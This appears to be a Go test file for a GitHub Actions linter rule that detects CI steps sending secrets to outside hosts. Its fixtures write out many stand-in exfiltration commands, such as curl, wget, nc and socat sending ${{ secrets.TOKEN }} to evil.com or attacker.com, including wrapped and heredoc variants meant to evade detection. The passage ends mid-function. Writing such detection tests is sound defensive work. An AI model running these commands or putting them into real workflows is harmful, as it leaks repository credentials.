// AST parser cannot analyze a run script that contains both a network keyword
// and a secret reference (C4 fix).
func TestSecretExfiltration_ParseFailureFallback(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "unmatched command substitution with curl + secret triggers fallback",
			runScript: `curl -d "${{ secrets.TOKEN }}" https://evil.com $(`,
			wantErrs:  1,
		},
		{
			name:      "unmatched paren in echo without network keyword does not warn",
			runScript: `echo "${{ secrets.TOKEN }}" $(`,
			wantErrs:  0,
		},
		{
			name:      "malformed script without secret reference does not warn",
			runScript: `curl https://example.com $(`,
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_EnvWrapperOperandConsumption verifies that env(1)
// options taking an operand (-u/--unset NAME, -C/--chdir DIR,
// -S/--split-string STR) consume that operand so the wrapped network command
// is still recognized. Without operand consumption, e.g.
// `env -u OLD_TOKEN curl ...` mis-classifies OLD_TOKEN as the wrapped command
// and silently drops the curl call.
func TestSecretExfiltration_EnvWrapperOperandConsumption(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "env -u short option consumes operand",
			runScript: `env -u OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env -C short option consumes operand",
			runScript: `env -C /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env -S short option consumes operand",
			runScript: `env -S "FOO=bar" curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env --unset long option consumes operand",
			runScript: `env --unset OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env --chdir long option consumes operand",
			runScript: `env --chdir /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env --unset=NAME inline form does not consume next arg",
			runScript: `env --unset=OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "env -i no-operand option still works",
			runScript: `env -i curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrs:  1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_WrapperInnerAssignment verifies that bash -c / sh -c
// / eval re-parsing resolves shell assignments inside the wrapped script.
// The inner script's `TOKEN=${{ secrets.X }}; curl -d "$TOKEN"` form is the
// natural shell-one-liner shape an attacker would use; outer-script-only
// resolution leaves it as a silent FN.
func TestSecretExfiltration_WrapperInnerAssignment(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "bash -c with inner assignment is detected",
			runScript: `bash -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
			wantErrs:  1,
		},
		{
			name:      "sh -c with inner assignment is detected",
			runScript: `sh -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
			wantErrs:  1,
		},
		{
			name:      "eval with inner assignment is detected",
			runScript: `eval 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
			wantErrs:  1,
		},
		{
			name:      "bash -c with allowlisted destination plus inner assignment is suppressed",
			runScript: `bash -c 'TOKEN=${{ secrets.GITHUB_TOKEN }}; curl -H "Authorization: Bearer $TOKEN" https://api.github.com/repos'`,
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_HeredocCmdSubstWalk verifies that command
// substitutions inside unquoted heredoc bodies and here-string words are
// walked. walkForNetworkCommands previously treated *syntax.Redirect as a
// no-op alongside SglQuoted / ParamExp / Lit, which silently dropped
// `cat <<EOF\n$(curl ...)\nEOF` and `cat <<< $(curl ...)`. Quoted heredocs
// (`<<'EOF'`) emit only a Lit part and remain FP-safe.
func TestSecretExfiltration_HeredocCmdSubstWalk(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "unquoted heredoc body with CmdSubst curl is detected",
			runScript: "cat <<EOF\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
			wantErrs:  1,
		},
		{
			name:      "unquoted here-string with CmdSubst curl is detected",
			runScript: `cat <<< $(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
			wantErrs:  1,
		},
		{
			name:      "quoted heredoc body with CmdSubst-shaped literal is not detected",
			runScript: "cat <<'EOF'\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_HeredocOnPipeProducer verifies that producer-side
// heredoc / here-string bodies on the upstream of a pipe flow into PipeInputs.
// The collectPipeInputArgsInto walker previously dropped *syntax.Redirect
// nodes silently, so `cat <<EOF | nc attacker 443` lost the heredoc body.
func TestSecretExfiltration_HeredocOnPipeProducer(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "heredoc on producer piped to nc is detected",
			runScript: "cat <<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
			wantErrs:  1,
		},
		{
			name:      "here-string on producer piped to nc is detected",
			runScript: `cat <<< '${{ secrets.TOKEN }}' | nc attacker.com 443`,
			wantErrs:  1,
		},
		{
			name:      "heredoc on producer piped to curl --data-binary @- is detected",
			runScript: "cat <<'EOF' | curl --data-binary @- https://evil.com\n${{ secrets.TOKEN }}\nEOF",
			wantErrs:  1,
		},
		{
			name:      "non-stdin redirect (fd 2) heredoc is not collected",
			runScript: "cat 2<<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

func TestSecretExfiltration_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "empty script",
			runScript:   ``,
			wantErrors:  0,
			description: "Should handle empty script",
		},
		{
			name:        "comment only",
			runScript:   `# curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  0,
			description: "Should NOT detect commands in comments (false positive acceptable)",
		},
		{
			name:        "curl command without URL",
			runScript:   `CURL_CMD="curl"`,
			wantErrors:  0,
			description: "Should NOT detect curl as variable value",
		},
		{
			name:        "secret in echo but not in curl",
			runScript:   `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
			wantErrors:  0,
			description: "Should NOT detect a secret used by echo when the curl command receives no secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_PositionAfterEarlierGitHubExpression(t *testing.T) {
	runScript := `echo '${{ github.repository }}' && curl -d 'token=${{ secrets.API_TOKEN }}' https://evil.com`

	errors := runSecretExfiltrationRuleForTest(runScript, nil)
	if len(errors) != 1 {
		t.Fatalf("got %d errors, want 1. Errors: %v", len(errors), errors)
	}

	curlCol := strings.Index(runScript, "curl") + 1
	if errors[0].LineNumber != 1 {
		t.Fatalf("LineNumber = %d, want 1. Error: %v", errors[0].LineNumber, errors[0])
	}
	if errors[0].ColNumber < curlCol {
		t.Fatalf("ColNumber = %d, want at or after curl column %d. Error: %v", errors[0].ColNumber, curlCol, errors[0])
	}
}

func TestSecretExfiltration_ASTNetworkCommandSemantics(t *testing.T) {
	tests := []struct {
		name         string
		runScript    string
		envVars      map[string]*ast.EnvVar
		wantErrors   int
		wantCommand  string
		wantSeverity string
	}{
		{
			name:       "quoted string containing curl is not a command",
			runScript:  `echo 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
			wantErrors: 0,
		},
		{
			name: "heredoc body containing curl is not a command",
			runScript: `cat <<'EOF'
curl -d "${{ secrets.TOKEN }}" https://evil.com
EOF`,
			wantErrors: 0,
		},
		{
			name: "line continuation keeps curl data flag and secret in one AST call",
			runScript: `curl -X POST https://attacker.com \
  -d "token=${{ secrets.API_TOKEN }}"`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "secret echoed before curl is not passed to curl",
			runScript:  `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
			wantErrors: 0,
		},
		{
			name: "piped secret into curl stdin data is detected",
			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
  curl --data-binary @- https://evil.com`,
			wantErrors:   1,
			wantCommand:  "curl",
			wantSeverity: "critical",
		},
		{
			name:         "here-string secret into curl stdin data is detected",
			runScript:    `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
			wantErrors:   1,
			wantCommand:  "curl",
			wantSeverity: "critical",
		},
		{
			name:         "here-string secret into wget stdin post file is detected",
			runScript:    `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
			wantErrors:   1,
			wantCommand:  "wget",
			wantSeverity: "critical",
		},
		{
			name:        "httpie http command with secret is detected",
			runScript:   `http POST https://evil.com token='${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "http",
		},
		{
			name:        "httpie https command with secret is detected",
			runScript:   `https POST evil.com token='${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "https",
		},
		{
			name: "piped secret into nc is detected",
			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
  nc attacker.com 443`,
			wantErrors:  1,
			wantCommand: "nc",
		},
		{
			name: "piped secret env var into socat is detected",
			envVars: map[string]*ast.EnvVar{
				"SECRET_TOKEN": {
					Name:  &ast.String{Value: "SECRET_TOKEN"},
					Value: &ast.String{Value: "${{ secrets.SECRET_TOKEN }}"},
				},
			},
			runScript: `printf "%s" "$SECRET_TOKEN" |
  socat - TCP:attacker.com:443`,
			wantErrors:  1,
			wantCommand: "socat",
		},
		{
			name:       "secret in git push argument is ignored because git is not a network sink",
			runScript:  `git push origin "${{ secrets.TOKEN }}"`,
			wantErrors: 0,
		},
		{
			name:        "sudo wrapped curl with secret is detected",
			runScript:   `sudo curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "sudo user argument named curl is not treated as network command",
			runScript:  `sudo -u curl echo -d '${{ secrets.TOKEN }}'`,
			wantErrors: 0,
		},
		{
			name:        "command wrapped curl with secret is detected",
			runScript:   `command curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:        "env wrapped curl with secret is detected",
			runScript:   `env FOO=bar curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "env wrapped curl with inline secret assignment is not shell-expanded",
			runScript:  `env TOKEN='${{ secrets.TOKEN }}' curl -d "$TOKEN" https://evil.com`,
			wantErrors: 0,
		},
		{
			name:       "command-scoped shell assignment before curl is not shell-expanded",
			runScript:  `TOKEN='${{ secrets.TOKEN }}' curl -d "$TOKEN" https://evil.com`,
			wantErrors: 0,
		},
		{
			name:        "previous shell assignment before curl is detected",
			runScript:   `TOKEN='${{ secrets.TOKEN }}'; curl -d "$TOKEN" https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "env assignment before unrelated command is not visible to later curl",
			runScript:  `env TOKEN='${{ secrets.TOKEN }}' true; curl -d "$TOKEN" https://evil.com`,
			wantErrors: 0,
		},
		{
			name:        "here-string secret into nc is detected",
			runScript:   `nc attacker.com 443 <<< '${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "nc",
		},
		{
			name:       "here-string to non-stdin fd is ignored",
			runScript:  `nc attacker.com 443 3<<< '${{ secrets.TOKEN }}'`,
			wantErrors: 0,
		},
		{
			name: "heredoc secret into nc is detected",
			runScript: `nc attacker.com 443 <<'EOF'
${{ secrets.TOKEN }}
EOF`,
			wantErrors:  1,
			wantCommand: "nc",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, tt.envVars)
			if len(errors) != tt.wantErrors {
				t.Fatalf("got %d errors, want %d. Errors: %v", len(errors), tt.wantErrors, errors)
			}

			if tt.wantCommand == "" {
				return
			}

			wantDescription := "network command '" + tt.wantCommand + "'"
			for _, err := range errors {
				if strings.Contains(err.Description, wantDescription) &&
					(tt.wantSeverity == "" || strings.Contains(err.Description, "("+tt.wantSeverity+")")) {
					return
				}
			}
			if tt.wantSeverity != "" {
				t.Fatalf("expected at least one error description to contain %q and severity %q. Errors: %v", wantDescription, tt.wantSeverity, errors)
			}
			t.Fatalf("expected at least one error description to contain %q. Errors: %v", wantDescription, errors)
		})
	}
}

func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	tests := []struct {
		input    string
		expected string
	}{
		{"${{ secrets.MY_TOKEN }}", "secrets.MY_TOKEN"},
		{"${{ secrets.API_KEY }}", "secrets.API_KEY"},
		{"${{secrets.TOKEN}}", "secrets.TOKEN"},
		{"${{  secrets.KEY  }}", "secrets.KEY"},
		{"some text", ""},
		{"${{ github.token }}", ""},
	}

	for _, tt := range tests {
		got := rule.extractSecretRef(tt.input)
		if got != tt.expected {
			t.Errorf("extractSecretRef(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestSecretExfiltration_ASTArgSinkClassification(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	curl, ok := networkCommandByName("curl")
	if !ok {
		t.Fatalf("curl command config not found")
	}

	call := shell.NetworkCommandCall{
		CommandName: "curl",
		Args: []shell.CommandArg{
			{Value: "-H", LiteralValue: "-H", IsFlag: true},
			{Value: "Content-Type: application/json", LiteralValue: "Content-Type: application/json"},
			{Value: "https://example.com/webhook", LiteralValue: "https://example.com/webhook"},
			{Value: "-d", LiteralValue: "-d", IsFlag: true},
			{Value: `{"token":"${{ secrets.TOKEN }}"}`, LiteralValue: `{"token":"${{ secrets.TOKEN }}"}`},
			{Value: "https://collector.example/upload", LiteralValue: "https://collector.example/upload"},
		},
	}

	if rule.isDataSinkArg(call, 2, curl) {
		t.Errorf("metadata header value should not make following URL positional arg a data sink")
	}
	if !rule.isDataSinkArg(call, 4, curl) {
		t.Errorf("-d payload value should be a data sink")
	}
	if rule.isDataSinkArg(call, 5, curl) {
		t.Errorf("URL positional arg should not be a data sink")
	}
}

// TestSecretExfiltration_EnvVarWithVarIndirection tests the case where a secret is
// mapped to an env var and the curl URL is stored in another variable (shadPS4 pattern).
func TestSecretExfiltration_EnvVarWithVarIndirection(t *testing.T) {
	makeStep := func(script string) *ast.Step {
		return &ast.Step{
			Exec: &ast.ExecRun{
				Run: &ast.String{
					Value: script,
					Pos:   &ast.Position{Line: 1, Col: 1},
				},
			},
			Env: &ast.Env{
				Vars: map[string]*ast.EnvVar{
					"GITHUB_TOKEN": {
						Value: &ast.String{Value: "${{ secrets.SHADPS4_TOKEN_REPO }}"},
					},
				},
			},
		}
	}

	tests := []struct {
		name       string
		runScript  string
		wantErrors int
		desc       string
	}{
		{
			name: "curl with env var token to api.github.com via variable (legitimate)",
			runScript: `api_url="https://api.github.com/repos/owner/repo"
result=$(curl -H "Authorization: token $GITHUB_TOKEN" "$api_url/releases/latest")`,
			wantErrors: 0,
			desc:       "Should NOT flag when URL variable resolves to api.github.com",
		},
		{
			name: "curl upload with env var token to uploads.github.com via variable (legitimate)",
			runScript: `upload_url="https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"
curl -X POST -H "Authorization: token $GITHUB_TOKEN" --data-binary @file "$upload_url"`,
			wantErrors: 0,
			desc:       "Should NOT flag when upload URL variable resolves to uploads.github.com",
		},
		{
			name: "curl with env var token to multi-line json POST to github api (legitimate)",
			runScript: `release_id=$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  -d '{
    "tag_name": "v1.0"
  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
			wantErrors: 0,
			desc:       "Should NOT flag curl with multi-line JSON body to GitHub API",
		},
		{
			name:       "curl with env var token to attacker site (malicious)",
			runScript:  `curl -H "Authorization: token $GITHUB_TOKEN" "https://evil.com/exfil"`,
			wantErrors: 1,
			desc:       "Should flag curl sending env-var secret to non-legit destination",
		},
		{
			name: "later safe assignment does not allowlist earlier malicious call",
			runScript: `api_url="https://evil.com/exfil"
curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"
api_url="https://api.github.com/repos/owner/repo"`,
			wantErrors: 1,
			desc:       "Should flag when URL variable was malicious at call time even if reassigned later",
		},
		{
			name: "env assignment does not allowlist shell-expanded destination variable",
			runScript: `api_url="https://evil.com/exfil"
env api_url=https://api.github.com curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"`,
			wantErrors: 1,
			desc:       "Should flag because $api_url expands before env can override it",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()
			step := makeStep(tt.runScript)
			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)
			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d. Errors: %v", tt.desc, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestResolveVarInScript(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		script  string
		varName string
		want    string
	}{
		{
			name:    "double-quoted assignment",
			script:  `api_url="https://api.github.com/repos/owner/repo"`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "single-quoted assignment",
			script:  `api_url='https://api.github.com/repos/owner/repo'`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "unquoted assignment",
			script:  `api_url=https://api.github.com/repos/owner/repo`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "variable not found",
			script:  `other_var="https://example.com"`,
			varName: "api_url",
			want:    "",
		},
		{
			name: "last assignment wins (reassignment bypass prevention)",
			script: `api_url="https://api.github.com/safe"
api_url="https://evil.com/exfil"`,
			varName: "api_url",
			want:    "https://evil.com/exfil",
		},
		{
			name:    "command-scoped assignment is not shell-visible",
			script:  `TOKEN="secret-value" curl -d "$TOKEN" https://evil.com`,
			varName: "TOKEN",
			want:    "",
		},
		{
			name: "indented assignment",
			script: `  if true; then
    api_url="https://api.github.com/repos"
  fi`,
			varName: "api_url",
			want:    "https://api.github.com/repos",
		},
		{
			name: "assignment among other lines",
			script: `echo "starting"
TOKEN="secret-value"
echo "done"`,
			varName: "TOKEN",
			want:    "secret-value",
		},
		{
			name:    "empty script",
			script:  "",
			varName: "api_url",
			want:    "",
		},
		{
			name: "multiple different variables",
			script: `base_url="https://api.github.com"
upload_url="https://uploads.github.com"`,
			varName: "upload_url",
			want:    "https://uploads.github.com",
		},
		{
			name: "last assignment wins across quote styles",
			script: `url="https://api.github.com"
url='https://evil.com'`,
			varName: "url",
			want:    "https://evil.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := resolveVarInScript(tt.script, tt.varName)
			if got != tt.want {
				t.Errorf("resolveVarInScript(%q, %q) = %q, want %q", tt.script, tt.varName, got, tt.want)
			}
		})
	}
}

// runSecretExfiltrationRuleWithAllowedHosts simulates a full workflow visit
// with a user-supplied allowed-hosts list. It exercises the same code path
// as the linter (UpdateConfig + VisitWorkflowPre + VisitJobPre +
// VisitWorkflowPost), so dead-allow warnings are also collected.
func runSecretExfiltrationRuleWithAllowedHosts(script string, allowedHosts []string) []*LintingError {
	rule := NewSecretExfiltrationRule()
	cfg := &Config{}
	cfg.SecretExfiltration.AllowedHosts = allowedHosts
	rule.UpdateConfig(cfg)

	wf := &ast.Workflow{}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: script,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)
	return rule.Errors()
}

func TestSecretExfiltration_AllowedHosts_ExactMatch(t *testing.T) {
	script := `curl -X POST https://api.example.com -d "token=${{ secrets.API_TOKEN }}"`

	gotWithoutAllow := runSecretExfiltrationRuleWithAllowedHosts(script, nil)
	if len(gotWithoutAllow) != 1 {
		t.Fatalf("baseline: expected 1 error without allowlist, got %d: %v", len(gotWithoutAllow), gotWithoutAllow)
	}

	gotWithAllow := runSecretExfiltrationRuleWithAllowedHosts(script, []string{"api.example.com"})
	if len(gotWithAllow) != 0 {
		t.Errorf("exact host match should suppress finding, got %d errors: %v", len(gotWithAllow), gotWithAllow)
	}
}

func TestSecretExfiltration_AllowedHosts_SuffixWildcard(t *testing.T) {
	tests := []struct {
		name      string
		script    string
		allowed   []string
		wantCount int
	}{
		{
			name:      "wildcard matches direct subdomain",
			script:    `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 0,
		},
		{
			name:      "wildcard matches deeper subdomain",
			script:    `curl -X POST https://sub.api.example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 0,
		},
		{
			// Matches TLS service-identity (RFC 9525, obsoletes RFC 6125)
			// and DNS wildcard (RFC 4592) semantics: "*.example.com"
			// covers subdomains only, NOT the apex. Users who want the
			// apex must list "example.com" explicitly. See
			// userHostAllowlistMatch doc comment.
			name:      "wildcard does NOT match apex",
			script:    `curl -X POST https://example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 1,
		},
		{
			// Locking in the workaround: the apex is reachable via an
			// explicit second entry, not via the wildcard.
			name:      "explicit apex entry alongside wildcard suppresses apex finding",
			script:    `curl -X POST https://example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com", "example.com"},
			wantCount: 0,
		},
		{
			name:      "wildcard does NOT match unrelated host",
			script:    `curl -X POST https://evil.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 1,
		},
		{
			name:      "wildcard does NOT match lookalike host",
			script:    `curl -X POST https://example.com.attacker.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 1,
		},
		{
			name:      "case-insensitive match",
			script:    `curl -X POST https://API.Example.COM -d "token=${{ secrets.X }}"`,
			allowed:   []string{"api.EXAMPLE.com"},
			wantCount: 0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := runSecretExfiltrationRuleWithAllowedHosts(tt.script, tt.allowed)
			// Filter dead-allow warnings out of the count: this test only
			// cares about exfiltration findings.
			count := 0
			for _, e := range got {
				if !strings.Contains(e.Description, "did not match any network command destination") {
					count++
				}
			}
			if count != tt.wantCount {
				t.Errorf("%s: expected %d findings, got %d: %v", tt.name, tt.wantCount, count, got)
			}
		})
	}
}

func TestSecretExfiltration_AllowedHosts_DeadAllowWarning_GlobalSuppressed(t *testing.T) {
	// Global config entries are intentionally NOT flagged as dead-allow on a
	// per-workflow basis: a shared global allowlist will naturally have
	// entries that any single workflow does not use. Flagging them would
	// produce noise across every workflow that doesn't happen to call the
	// same hosts. See PR #477 review.
	script := `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`
	allowed := []string{"api.example.com", "unused.example.org"}

	got := runSecretExfiltrationRuleWithAllowedHosts(script, allowed)

	for _, e := range got {
		if strings.Contains(e.Description, "did not match any network command destination") {
			t.Errorf("global config dead-allow warning unexpected, got %q", e.Description)
		}
	}
}

func TestSecretExfiltration_AllowedHosts_DeadAllowWarning_DirectiveOnly(t *testing.T) {
	// Per-workflow directive entries SHOULD still produce a dead-allow
	// warning when unused — they are scoped to one workflow file so
	// "unused here" maps directly to "remove from this file".
	rule := NewSecretExfiltrationRule()
	cfg := &Config{}
	rule.UpdateConfig(cfg)

	wf := &ast.Workflow{
		BaseNode: &yaml.Node{
			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com, unused.example.org",
			Line:        1,
			Column:      1,
		},
	}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)

	var deadWarnings []*LintingError
	for _, e := range rule.Errors() {
		if strings.Contains(e.Description, "did not match any network command destination") {
			deadWarnings = append(deadWarnings, e)
		}
	}
	if len(deadWarnings) != 1 {
		t.Fatalf("expected exactly 1 dead-allow warning for unused directive entry, got %d: %v", len(deadWarnings), rule.Errors())
	}
	if !strings.Contains(deadWarnings[0].Description, "unused.example.org") {
		t.Errorf("dead-allow warning should reference unused.example.org, got %q", deadWarnings[0].Description)
	}
}

func TestSecretExfiltration_AllowedHosts_PerWorkflowComment(t *testing.T) {
	// Build a workflow whose root yaml node carries the directive in its
	// HeadComment. This mirrors how yaml.v3 attaches a leading file comment.
	rule := NewSecretExfiltrationRule()
	cfg := &Config{}
	rule.UpdateConfig(cfg)

	wf := &ast.Workflow{
		BaseNode: &yaml.Node{
			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com, *.internal.example.com",
			Line:        1,
			Column:      1,
		},
	}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	step2 := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://staging.internal.example.com -d "k=${{ secrets.Y }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step, step2}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)

	for _, e := range rule.Errors() {
		if !strings.Contains(e.Description, "did not match any network command destination") {
			t.Errorf("per-workflow comment override should suppress finding, still got: %v", e)
		}
	}
}

func TestSecretExfiltration_AllowedHosts_NoConfigUnchanged(t *testing.T) {
	// Sanity check: with no allowed-hosts configured, behavior is identical
	// to the pre-#473 path. Existing tests already cover this but a direct
	// assertion against the new wrapper keeps regressions visible.
	script := `curl -X POST https://api.example.com -d "token=${{ secrets.API_TOKEN }}"`
	got := runSecretExfiltrationRuleWithAllowedHosts(script, nil)
	if len(got) != 1 {
		t.Errorf("with empty allowed-hosts, expected 1 finding, got %d: %v", len(got), got)
	}
}

func TestNormalizeAllowedHost(t *testing.T) {
	// wantReasonContains is a substring assertion (not full match) so message
	// wording can be refined without churn, while still detecting silent
	// rejection-category regressions (e.g. a scheme-prefix entry reclassified
	// as a generic invalid host).
	tests := []struct {
		input              string
		want               string
		wantReasonContains string
	}{
		{"api.example.com", "api.example.com", ""},
		{"  API.example.COM ", "api.example.com", ""},
		{`"api.example.com"`, "api.example.com", ""},
		{"*.example.com", "*.example.com", ""},
		{"*.Example.com", "*.example.com", ""},
		// Rejected forms — each pinned to its specific reason category so a
		// regression that lumps everything under a generic error becomes a
		// test failure.
		{"", "", "empty"},
		{"*", "", "wildcard"},
		{"foo.*.bar", "", "wildcard"},
		{"**.example.com", "", "wildcard"},
		{"https://api.example.com", "", "scheme"},
		{"api.example.com/path", "", "path"},
		{"api.example.com:443", "", "port"},
		{"api example.com", "", "whitespace"},
	}
	for _, tt := range tests {
		got, reason := normalizeAllowedHost(tt.input)
		if got != tt.want {
			t.Errorf("normalizeAllowedHost(%q) = %q, want %q", tt.input, got, tt.want)
		}
		if tt.wantReasonContains == "" {
			if reason != "" {
